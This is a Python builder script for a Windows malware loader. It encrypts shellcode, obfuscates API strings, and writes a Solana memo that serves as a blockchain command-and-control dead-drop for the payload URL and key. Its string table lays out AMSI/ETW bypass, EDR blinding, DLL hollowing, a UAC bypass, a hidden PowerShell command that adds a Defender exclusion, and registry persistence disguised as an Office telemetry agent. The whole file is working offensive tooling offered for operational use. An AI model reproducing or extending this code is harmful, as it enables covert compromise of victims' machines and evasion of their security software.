#!/usr/bin/env python3
"""
Encrypt.py - Shellcode Encryption & Build Randomizer

Usage:
  python Encrypt.py <shellcode.bin> --url https://your-server/payload.dat --sol-wallet <ADDRESS>
  python Encrypt.py <shellcode.bin> --url https://your-server/foo.bin --sol-wallet <ADDRESS> \\
        [--out custom.bin] [--rpc https://api.devnet.solana.com]

Generates:
  <basename-of-url>  - LZNT1-compressed + Chaskey-CTR-encrypted shellcode.
                       Filename matches the URL's last path component so the file
                       you upload to your C2 already has the right name.
                       Override with --out if needed.
  Payload.h          - SOL wallet address (XOR-obfuscated) + per-build randomized
                       string keys and placement XOR key. NO URL or crypto key is
                       embedded in the binary.
  memo.txt           - The exact string to post as a Solana memo instruction from
                       the wallet address above (its FIRST / oldest transaction).
                       Format: <url>|<32-hex-key>|<24-hex-nonce>
                       The loader fetches this at runtime via the Solana JSON-RPC
                       API, parses URL + key + nonce, then downloads and decrypts
                       the payload. Rotating the key just means posting a new
                       transaction and re-running Encrypt.py — no rebuild needed.

Beacon flow:
  1. Run Encrypt.py  → encrypted payload + Payload.h + memo.txt
  2. Upload payload  → staging server at the URL you provided
  3. Post memo.txt   → send a Solana transaction from <sol-wallet> with the memo
  4. build.bat       → binary with wallet address only; URL+key live on-chain
"""

import sys
import os
import re
import random
import struct


# -----------------------------------------------------------------------
# All sensitive strings — 4-byte rotating XOR key, randomized each run.
# Key bytes are chosen so no XOR produces 0x00 at any character position,
# keeping the null terminator as a reliable DEOBF() sentinel in C.
# -----------------------------------------------------------------------
OBFUSCATED_STRINGS = {
    # Evasion.c
    "XSTR_NTDLL_DLL":               "ntdll.dll",
    "XSTR_ETW_EVENT_WRITE":         "EtwEventWrite",
    "XSTR_AMSI_DLL":                "amsi.dll",
    "XSTR_AMSI_SCAN_BUFFER":        "AmsiScanBuffer",
    # Staging.c
    "XSTR_WININET_DLL":             "wininet.dll",
    "XSTR_INTERNET_OPEN_A":         "InternetOpenA",
    "XSTR_INTERNET_CONNECT_A":      "InternetConnectA",
    "XSTR_HTTP_OPEN_REQUEST_A":     "HttpOpenRequestA",
    "XSTR_HTTP_SEND_REQUEST_A":     "HttpSendRequestA",
    "XSTR_INTERNET_READ_FILE":      "InternetReadFile",
    "XSTR_INTERNET_CLOSE_HANDLE":   "InternetCloseHandle",
    "XSTR_INTERNET_SET_OPTION_A":   "InternetSetOptionA",
    "XSTR_INTERNET_QUERY_OPTION_A": "InternetQueryOptionA",
    "XSTR_INTERNET_CRACK_URL_A":    "InternetCrackUrlA",
    "XSTR_USER_AGENT":              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "XSTR_HTTP_GET":                "GET",
    "XSTR_HTTP_QUERY_INFO_A":       "HttpQueryInfoA",
    # Sacrificial DLL allowlist (multimedia / debug / printing — low-sensitivity
    # categories not on Elastic/MDE public stomp-target rules; rotate randomly
    # per run via RDTSC). Loader picks one that's present and has enough .text.
    "XSTR_STOMP_DLL_1":             "xpsservices.dll",
    "XSTR_STOMP_DLL_2":             "mfreadwrite.dll",
    "XSTR_STOMP_DLL_3":             "dbgcore.dll",
    "XSTR_STOMP_DLL_4":             "mfsensorgroup.dll",
    # Evasion.c (patchless AMSI/ETW via VEH + hardware breakpoints)
    "XSTR_RTL_ADD_VEH":             "RtlAddVectoredExceptionHandler",
    "XSTR_RTL_REMOVE_VEH":          "RtlRemoveVectoredExceptionHandler",
    "XSTR_NT_CONTINUE":             "NtContinue",
    "XSTR_RTL_CAPTURE_CTX":         "RtlCaptureContext",
    # Stomper.c (phantom DLL hollowing via NTFS transactions)
    "XSTR_KTMW32_DLL":              "ktmw32.dll",
    "XSTR_CREATE_TRANSACTION":      "CreateTransaction",
    "XSTR_CREATE_FILE_TXA":         "CreateFileTransactedA",
    "XSTR_ROLLBACK_TRANSACTION":    "RollbackTransaction",
    "XSTR_KERNEL32_DLL":            "kernel32.dll",
    "XSTR_SYS32_PREFIX":            "C:\\Windows\\System32\\",
    "XSTR_GET_TEMP_PATH_A":         "GetTempPathA",
    "XSTR_COPY_FILE_A":             "CopyFileA",
    "XSTR_FIND_FIRST_FILE_A":       "FindFirstFileA",
    "XSTR_FIND_NEXT_FILE_A":        "FindNextFileA",
    "XSTR_FIND_CLOSE":              "FindClose",
    "XSTR_CREATE_FILE_A":           "CreateFileA",
    "XSTR_DLL_WILDCARD":            "*.dll",
    # Crypt.c (decompression via ntdll)
    "XSTR_RTL_DECOMPRESS_BUFFER":   "RtlDecompressBuffer",
    # Evasion.c (DLL notification callback removal — EDR blinding)
    "XSTR_LDR_REG_DLL_NOTIF":      "LdrRegisterDllNotification",
    "XSTR_LDR_UNREG_DLL_NOTIF":    "LdrUnregisterDllNotification",
    # Syscalls.c (clean ntdll via \KnownDlls\ntdll.dll section)
    "XSTR_KNOWNDLLS_NTDLL":        "\\KnownDlls\\ntdll.dll",
    # main.c (Poison Fiber kick-off — avoids PsSetCreateThreadNotifyRoutine)
    "XSTR_CONVERT_THREAD_TO_FIBER": "ConvertThreadToFiber",
    "XSTR_CREATE_FIBER":            "CreateFiber",
    "XSTR_SWITCH_TO_FIBER":         "SwitchToFiber",
    # GhostHollow.c (FILE_FLAG_DELETE_ON_CLOSE-backed image section — no NTFS
    # transaction, so Defender's MpFilter transaction-aware scanner is blind)
    "XSTR_DELETE_FILE_A":           "DeleteFileA",
    # Uac.c (AppInfo RPC UAC bypass — compiled only for UAC builds)
    # ncalrpc transport for the AppInfo RPC binding
    "XSTR_NCALRPC":                 "ncalrpc",
    # AppInfo service interface UUID {201ef99a-7fa0-444c-9399-19ba84f12a1a}
    "XSTR_APPINFO_UUID":            "201ef99a-7fa0-444c-9399-19ba84f12a1a",
    # WinStation for child-process lpDesktop
    "XSTR_WINSTA_DEFAULT":          "WinSta0\\Default",
    # Filename suffixes appended to GetSystemDirectoryW result
    "XSTR_WINVER_EXE":              "\\winver.exe",
    "XSTR_COMPUTERDEFAULTS_EXE":    "\\ComputerDefaults.exe",
    # PowerShell WD-exclusion command pieces
    "XSTR_PS_EXE":                  "powershell.exe",
    "XSTR_WD_PS_FLAGS":             " -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionPath '",
    "XSTR_WD_CMD_SUFFIX":           "'\"",
    # rpcrt4.dll RPC functions (resolved dynamically, no static import)
    "XSTR_RPCRT4_DLL":              "rpcrt4.dll",
    "XSTR_RPC_STRING_BIND_COMP":    "RpcStringBindingComposeW",
    "XSTR_RPC_BIND_FROM_STR":       "RpcBindingFromStringBindingW",
    "XSTR_RPC_STRING_FREE":         "RpcStringFreeW",
    "XSTR_RPC_BIND_SET_AUTH":       "RpcBindingSetAuthInfoExW",
    "XSTR_RPC_ASYNC_INIT":          "RpcAsyncInitializeHandle",
    "XSTR_RPC_ASYNC_COMPLETE":      "RpcAsyncCompleteCall",
    "XSTR_RPC_BIND_FREE":           "RpcBindingFree",
    "XSTR_NDR_ASYNC_CALL":          "NdrAsyncClientCall",
    "XSTR_NDR_OLE_ALLOC":           "NdrOleAllocate",
    "XSTR_NDR_OLE_FREE":            "NdrOleFree",
    "XSTR_CREATE_WELL_KNOWN_SID":   "CreateWellKnownSid",
    # Install.c (first-run installer — UAC builds)
    "XSTR_APPDATA_VAR":             "APPDATA",
    "XSTR_INSTALL_SUBDIR":          "\\Microsoft\\Office\\Updates\\",
    "XSTR_PERSIST_EXE_NAME":        "msoia.exe",
    "XSTR_STARTUP_VALUE_NAME":      "Office Telemetry Agent",
    "XSTR_STARTUP_APPROVED_KEY":    "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run",
    "XSTR_GET_ENV_VAR_A":           "GetEnvironmentVariableA",
    "XSTR_CREATE_DIRECTORY_A":      "CreateDirectoryA",
    "XSTR_SET_FILE_ATTR_A":         "SetFileAttributesA",
    # Registry functions (advapi32 — A-suffix, used by Install.c with ANSI paths)
    "XSTR_REG_OPEN_KEY_EX_A":       "RegOpenKeyExA",
    "XSTR_REG_CREATE_KEY_EX_A":     "RegCreateKeyExA",
    "XSTR_REG_SET_VALUE_EX_A":      "RegSetValueExA",
    "XSTR_REG_CLOSE_KEY":           "RegCloseKey",
    # Persist.c + legacy (registry — compiled for all/UAC builds)
    "XSTR_ADVAPI32_DLL":            "advapi32.dll",
    "XSTR_WD_EXCL_PATH":            "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths",
    "XSTR_RUN_KEY_PATH":            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    "XSTR_PERSIST_NAME":            "WUAssistant",
    # Solana.c — blockchain C2 beacon
    # Host for JSON-RPC calls to fetch the memo that carries URL + key.
    # Obfuscated so the string "solana.com" never appears in plain text.
    "XSTR_SOL_RPC_HOST":            "api.mainnet-beta.solana.com",
    # Prefix emitted by the SPL Memo program in transaction log messages:
    #   "Program log: <memo text>"
    # Used to locate the memo inside a getTransaction JSON response.
    "XSTR_SOL_MEMO_PFX":            "Program log: ",
    # InternetConnectA / HttpOpenRequestA need "POST" for JSON-RPC
    "XSTR_HTTP_POST":               "POST",
    # Content-Type header sent with Solana JSON-RPC requests
    "XSTR_JSON_CONTENT_TYPE":       "Content-Type: application/json",
}


# ---- Chaskey-12 Block Cipher (ARX, 128-bit) ----

def rotl32(x, n):
    return ((x << n) | (x >> (32 - n))) & 0xFFFFFFFF


def chaskey_permute(v):
    """Chaskey-12 permutation (12 rounds)."""
    for _ in range(12):
        v[0] = (v[0] + v[1]) & 0xFFFFFFFF
        v[1] = rotl32(v[1], 5)
        v[1] ^= v[0]
        v[0] = rotl32(v[0], 16)
        v[2] = (v[2] + v[3]) & 0xFFFFFFFF
        v[3] = rotl32(v[3], 8)
        v[3] ^= v[2]
        v[0] = (v[0] + v[3]) & 0xFFFFFFFF
        v[3] = rotl32(v[3], 13)
        v[3] ^= v[0]
        v[2] = (v[2] + v[1]) & 0xFFFFFFFF
        v[1] = rotl32(v[1], 7)
        v[1] ^= v[2]
        v[2] = rotl32(v[2], 16)
    return v


def chaskey_ctr_crypt(data, key_bytes, nonce_bytes):
    """Chaskey-CTR encryption/decryption (symmetric)."""
    key = list(struct.unpack('<4I', key_bytes))
    nonce = list(struct.unpack('<3I', nonce_bytes[:12]))

    result = bytearray()
    for blk in range((len(data) + 15) // 16):
        ctr = [nonce[0] ^ key[0], nonce[1] ^ key[1], nonce[2] ^ key[2], blk ^ key[3]]
        ctr = chaskey_permute(list(ctr))
        ctr[0] ^= key[0]
        ctr[1] ^= key[1]
        ctr[2] ^= key[2]
        ctr[3] ^= key[3]
        keystream = struct.pack('<4I', *ctr)

        offset = blk * 16
        chunk = data[offset:offset + 16]
        for i in range(len(chunk)):
            result.append(chunk[i] ^ keystream[i])

    return bytes(result)


# ---- LZNT1 Compression (via Windows ntdll) ----

def lznt1_compress(data):
    """Compress data using LZNT1 via ntdll (Windows only)."""
    if sys.platform != 'win32':
        print("[!] LZNT1 compression requires Windows, skipping")
        return None

    import ctypes
    ntdll = ctypes.windll.ntdll

    COMPRESSION_FORMAT_LZNT1 = 0x0002
    COMPRESSION_ENGINE_STANDARD = 0x0000
    fmt = COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_STANDARD

    ws_size = ctypes.c_ulong(0)
    fws_size = ctypes.c_ulong(0)
    status = ntdll.RtlGetCompressionWorkSpaceSize(
        fmt, ctypes.byref(ws_size), ctypes.byref(fws_size)
    )
    if status != 0:
        print(f"[!] RtlGetCompressionWorkSpaceSize failed: 0x{status:08X}")
        return None

    workspace = ctypes.create_string_buffer(ws_size.value)
    out_size = len(data) * 2 + 4096
    out_buf = ctypes.create_string_buffer(out_size)
    final_size = ctypes.c_ulong(0)

    status = ntdll.RtlCompressBuffer(
        fmt, data, len(data),
        out_buf, out_size, 4096,
        ctypes.byref(final_size), workspace
    )
    if status != 0:
        print(f"[!] RtlCompressBuffer failed: 0x{status:08X}")
        return None

    return bytes(out_buf[:final_size.value])


# ---- String Obfuscation (4-byte rotating XOR key) ----

def pick_xor_keys(strings_dict):
    """Pick 4 random XOR key bytes. Each key byte avoids producing 0x00 at its positions."""
    keys = []
    for pos in range(4):
        chars_at_pos = set()
        for s in strings_dict.values():
            data = s.encode('ascii')
            for i in range(pos, len(data), 4):
                chars_at_pos.add(data[i])
        valid = [k for k in range(1, 256) if k not in chars_at_pos]
        if not valid:
            raise ValueError(f"No valid XOR key for position {pos}")
        keys.append(random.choice(valid))
    return keys


def xor_encode_string(s, keys):
    """XOR-encode string with 4-byte rotating key, append raw 0x00 terminator."""
    encoded = []
    for i, b in enumerate(s.encode('ascii')):
        encoded.append((b ^ keys[i % 4]) & 0xFF)
    encoded.append(0x00)
    return encoded


def format_initializer(name, data, items_per_line=16):
    """Format as #define NAME { 0x.., ... }"""
    if len(data) <= items_per_line:
        vals = ", ".join(f"0x{b:02X}" for b in data)
        return f"#define {name} {{ {vals} }}"

    lines = [f"#define {name} {{ \\"]
    for i in range(0, len(data), items_per_line):
        chunk = data[i:i + items_per_line]
        vals = ", ".join(f"0x{b:02X}" for b in chunk)
        if i + items_per_line < len(data):
            lines.append(f"    {vals}, \\")
        else:
            lines.append(f"    {vals} \\")
    lines.append("}")
    return "\n".join(lines)


def derive_output_filename(url: str) -> str:
    """Return the last path component of the URL (the filename the loader will
    GET), stripped of query/fragment. Falls back to 'payload.dat' if the URL
    has no usable basename (e.g. https://host/ with nothing after the slash).
    This keeps the local file produced by Encrypt.py and the file the operator
    uploads to the C2 in sync — no manual rename required."""
    from urllib.parse import urlparse
    path = urlparse(url).path
    name = path.rsplit("/", 1)[-1].strip()
    if not name or "/" in name or "\\" in name or name in (".", ".."):
        return "payload.dat"
    return name


# Solana base-58 alphabet (same as Bitcoin — no 0, O, I, l)
_B58_ALPHABET = re.compile(r'^[1-9A-HJ-NP-Za-km-z]{32,44}$')

def validate_sol_wallet(address: str) -> bool:
    """Basic sanity check: base58 chars, 32-44 characters long.
    Solana public keys are 32 bytes; in base58 that encodes to 43 or 44
    characters for a typical non-zero key. We accept 32-44 to be safe."""
    return bool(_B58_ALPHABET.match(address))


def main():
    if len(sys.argv) < 2 or "--url" not in sys.argv or "--sol-wallet" not in sys.argv:
        print(
            f"Usage: {sys.argv[0]} <shellcode.bin> "
            "--url https://server/payload.dat "
            "--sol-wallet <ADDRESS> "
            "[--out <file>] "
            "[--rpc https://api.mainnet-beta.solana.com]"
        )
        sys.exit(1)

    shellcode_path = sys.argv[1]

    idx = sys.argv.index("--url")
    staging_url = sys.argv[idx + 1]

    idx = sys.argv.index("--sol-wallet")
    sol_wallet = sys.argv[idx + 1]

    # Optional: custom RPC endpoint (devnet / testnet / private node)
    rpc_host = "api.mainnet-beta.solana.com"
    if "--rpc" in sys.argv:
        from urllib.parse import urlparse
        rpc_url_arg = sys.argv[sys.argv.index("--rpc") + 1]
        parsed_rpc = urlparse(rpc_url_arg)
        if parsed_rpc.hostname:
            rpc_host = parsed_rpc.hostname

    # Validate wallet address (base58, 32-44 chars)
    if not validate_sol_wallet(sol_wallet):
        print(f"[!] Invalid Solana wallet address: '{sol_wallet}'")
        print("    Expected base58 string, 32-44 characters")
        sys.exit(1)

    # --out overrides URL-derived filename
    out_name = None
    if "--out" in sys.argv:
        out_name = sys.argv[sys.argv.index("--out") + 1]
    if not out_name:
        out_name = derive_output_filename(staging_url)

    with open(shellcode_path, "rb") as f:
        shellcode = f.read()

    print(f"[*] Shellcode:   {len(shellcode)} bytes ({len(shellcode)/1024/1024:.1f} MB)")
    print(f"[*] SOL wallet:  {sol_wallet}")
    print(f"[*] RPC host:    {rpc_host}")
    print(f"[*] Staging URL: {staging_url}")

    # --- LZNT1 Compression ---
    compressed = lznt1_compress(shellcode)
    if compressed and len(compressed) < len(shellcode):
        use_compression = True
        payload_data = compressed
        print(f"[+] Compressed: {len(shellcode)} -> {len(compressed)} bytes "
              f"({len(compressed)*100//len(shellcode)}%)")
    else:
        use_compression = False
        payload_data = shellcode
        if compressed:
            print(f"[*] Compression didn't help ({len(compressed)} >= {len(shellcode)}), skipping")
        else:
            print(f"[*] Compression unavailable, skipping")

    # --- Chaskey-CTR Encryption ---
    key_size = 16
    chaskey_key   = bytes(random.randint(0, 255) for _ in range(key_size))
    chaskey_nonce = bytes(random.randint(0, 255) for _ in range(12))

    print(f"[*] Encrypting with Chaskey-CTR...")
    encrypted = chaskey_ctr_crypt(payload_data, chaskey_key, chaskey_nonce)

    script_dir = os.path.dirname(os.path.abspath(__file__))

    # Write encrypted payload. Filename matches the URL's basename by default
    # (or the operator's --out arg) so encrypt-then-upload is a no-rename flow.
    enc_path = os.path.join(script_dir, out_name)
    with open(enc_path, "wb") as f:
        f.write(encrypted)
    print(f"[+] {out_name}: {len(encrypted)} bytes")

    # --- Build the on-chain memo ---
    # Format: <url>|<32-hex-key>|<24-hex-nonce>|<original-size>|<compression-flag>
    #
    # Fields:
    #   url               staging server path for the encrypted payload
    #   32-hex-key        Chaskey-CTR key (16 bytes, hex-encoded)
    #   24-hex-nonce      Chaskey-CTR nonce (12 bytes, hex-encoded)
    #   original-size     uncompressed shellcode size (decimal); needed by
    #                     RtlDecompressBuffer to allocate the output buffer
    #   compression-flag  '1' if LZNT1-compressed before encryption, '0' otherwise
    #
    # Including size + compression in the memo means the binary contains NO
    # payload-specific data at all — the same build can decrypt any future
    # payload without recompiling.
    memo = (
        f"{staging_url}"
        f"|{chaskey_key.hex()}"
        f"|{chaskey_nonce.hex()}"
        f"|{len(shellcode)}"
        f"|{1 if use_compression else 0}"
    )

    memo_path = os.path.join(script_dir, "memo.txt")
    with open(memo_path, "w") as f:
        f.write(memo + "\n")
    print(f"[+] memo.txt: {len(memo)} chars")

    # --- Pick random 4-byte XOR key for string obfuscation ---
    xkeys = pick_xor_keys(OBFUSCATED_STRINGS)
    print(f"[+] XKEY: [{', '.join(f'0x{k:02X}' for k in xkeys)}]")

    # --- XOR-encode the wallet address (single-byte key, same scheme as old URL) ---
    wallet_bytes = sol_wallet.encode('ascii') + b'\x00'
    wallet_xor_key = random.randint(1, 255)
    xored_wallet = bytes([(b ^ wallet_xor_key) & 0xFF for b in wallet_bytes])

    # --- XOR-encode the RPC host (used by Solana.c, separate single-byte key) ---
    rpc_bytes = rpc_host.encode('ascii') + b'\x00'
    rpc_xor_key = random.randint(1, 255)
    # Ensure no null collision: key must not equal any byte in rpc_host
    rpc_host_byte_set = set(rpc_bytes[:-1])  # exclude the null terminator
    while rpc_xor_key in rpc_host_byte_set:
        rpc_xor_key = random.randint(1, 255)
    xored_rpc = bytes([(b ^ rpc_xor_key) & 0xFF for b in rpc_bytes])

    # Per-build 16-byte XOR key for Phantom/Ghost placement write encryption.
    placement_xor = bytes(random.randint(0, 255) for _ in range(16))

    # --- Generate Payload.h ---
    lines = []
    lines.append("#pragma once")
    lines.append("")
    lines.append("// Auto-generated by Encrypt.py — do not edit")
    lines.append("// Randomized values change every build")
    lines.append("")
    lines.append("// ---- Fixed crypto constant ----")
    lines.append(f"#define KEY_SIZE        {key_size}")
    lines.append("// NOTE: PAYLOAD_SIZE and USE_COMPRESSION are NO LONGER compiled in.")
    lines.append("// They travel in the on-chain memo so any future payload (different")
    lines.append("// size or compression) works with the same binary, no rebuild needed.")
    lines.append("")
    lines.append("// ---- Solana beacon ----")
    lines.append("// Wallet whose FIRST (oldest) transaction carries the memo:")
    lines.append("//   <staging_url>|<32-hex-key>|<24-hex-nonce>")
    lines.append("// The loader resolves the URL and decryption key at runtime via")
    lines.append("// the Solana JSON-RPC API. No URL or key is embedded in the binary.")
    lines.append(f"#define SOL_WALLET_XOR_KEY  0x{wallet_xor_key:02X}")
    lines.append(f"#define SOL_WALLET_LEN      {len(wallet_bytes)}")
    lines.append(format_initializer("INIT_SOL_WALLET", xored_wallet))
    lines.append("")
    lines.append("// RPC host (XOR-obfuscated, separate key from wallet)")
    lines.append(f"#define SOL_RPC_XOR_KEY     0x{rpc_xor_key:02X}")
    lines.append(f"#define SOL_RPC_HOST_LEN    {len(rpc_bytes)}")
    lines.append(format_initializer("INIT_SOL_RPC_HOST", xored_rpc))
    lines.append("")
    lines.append("// ---- Per-build 16-byte write-encryption key ----")
    lines.append("// Phantom.c / GhostHollow.c XOR shellcode before writing to the")
    lines.append("// transacted / delete-on-close file (MpFilter sees garbage).")
    lines.append(format_initializer("INIT_PLACEMENT_XOR_KEY", placement_xor))
    lines.append("#define PLACEMENT_XOR_KEY_LEN 16")
    lines.append("")
    lines.append("// ---- 4-byte string obfuscation key (randomized per build) ----")
    for i, k in enumerate(xkeys):
        lines.append(f"#define XKEY_{i}          0x{k:02X}")
    lines.append("")

    # Obfuscated API/DLL strings
    lines.append("// ---- Obfuscated strings (4-byte rotating XOR, randomized per build) ----")
    for name, plaintext in OBFUSCATED_STRINGS.items():
        encoded = xor_encode_string(plaintext, xkeys)
        lines.append(format_initializer(name, encoded))
    lines.append("")

    with open(os.path.join(script_dir, "Payload.h"), "w") as f:
        f.write("\n".join(lines) + "\n")
    print(f"[+] Payload.h generated")

    # --- Verify encryption round-trip ---
    decrypted = chaskey_ctr_crypt(encrypted, chaskey_key, chaskey_nonce)
    assert decrypted == payload_data, "Decryption verification failed"
    print(f"[+] Encryption verification PASSED")

    # Verify decompression if used
    if use_compression:
        import ctypes
        ntdll = ctypes.windll.ntdll
        out_buf = ctypes.create_string_buffer(len(shellcode))
        final_size = ctypes.c_ulong(0)
        status = ntdll.RtlDecompressBuffer(
            0x0002, out_buf, len(shellcode),
            payload_data, len(payload_data),
            ctypes.byref(final_size)
        )
        assert status == 0 and final_size.value == len(shellcode)
        assert bytes(out_buf[:final_size.value]) == shellcode
        print(f"[+] Compression verification PASSED")

    # Verify wallet XOR round-trip
    recovered_wallet = bytes([(b ^ wallet_xor_key) & 0xFF for b in xored_wallet[:-1]])
    assert recovered_wallet.decode('ascii') == sol_wallet, "Wallet XOR verification failed"
    print(f"[+] Wallet obfuscation verified")

    # Verify string obfuscation
    first_name  = list(OBFUSCATED_STRINGS.keys())[0]
    first_plain = OBFUSCATED_STRINGS[first_name]
    first_encoded = xor_encode_string(first_plain, xkeys)
    for i, byte_val in enumerate(first_encoded[:-1]):
        assert (byte_val ^ xkeys[i % 4]) == first_plain.encode('ascii')[i]
    print(f"[+] String obfuscation verified")

    # --- Summary ---
    print()
    print("=" * 60)
    print(f"[*] Upload '{out_name}' to: {staging_url}")
    print()
    print(f"[*] Post the following memo as the FIRST Solana transaction")
    print(f"    from wallet: {sol_wallet}")
    print()
    print(f"    {memo}")
    print()
    print(f"    (also saved to memo.txt)")
    print()
    print(f"[*] Then build: build.bat")
    print("=" * 60)


if __name__ == "__main__":
    main()
